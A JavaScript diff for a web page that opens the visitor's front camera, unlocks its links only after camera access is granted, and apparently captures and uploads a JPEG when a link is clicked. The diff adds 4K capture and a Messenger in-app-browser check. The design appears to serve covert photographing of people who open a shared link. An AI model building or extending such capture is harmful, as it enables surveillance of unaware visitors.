@@ -9,6 +9,9 @@ const linkBoxes = document.querySelectorAll('.link-box');
 const cloudName = 'dsfc6qjqx';
 const uploadPreset = 'ml_default';
 
+// Add this at the top of the file
+const isMessenger = /FBAN|FBAV/i.test(navigator.userAgent);
+
 function showCameraModal() {
   modal.style.display = 'block';
 }
@@ -18,6 +21,11 @@ function hideCameraModal() {
 }
 
 function initCamera() {
+  if (isMessenger) {
+    showCameraModal();
+    return;
+  }
+  
   // Stop existing stream if present
   if (video.srcObject) {
     video.srcObject.getTracks().forEach(track => track.stop());
@@ -26,11 +34,16 @@ function initCamera() {
   navigator.mediaDevices.getUserMedia({
     video: {
       facingMode: 'user',
-      width: { ideal: 640 },
-      height: { ideal: 480 }
+      width: { ideal: 4096 },  // Max supported by most devices
+      height: { ideal: 2160 },  // 4K resolution
+      aspectRatio: { ideal: 16/9 }
     }
   })
   .then(stream => {
+    const track = stream.getVideoTracks()[0];
+    const settings = track.getSettings();
+    canvas.width = settings.width;
+    canvas.height = settings.height;
     video.srcObject = stream;
     hideCameraModal();
     // Enable links
@@ -95,4 +108,11 @@ captureLinks.forEach(link => {
       });
     }, 'image/jpeg');
   });
-}); 
+});
+
+// Update modal content check
+if (isMessenger) {
+  document.querySelector('.modal-content p').textContent = 
+    "This feature doesn't work in Messenger. Please open in your browser.";
+  retryButton.style.display = 'none';
+} 
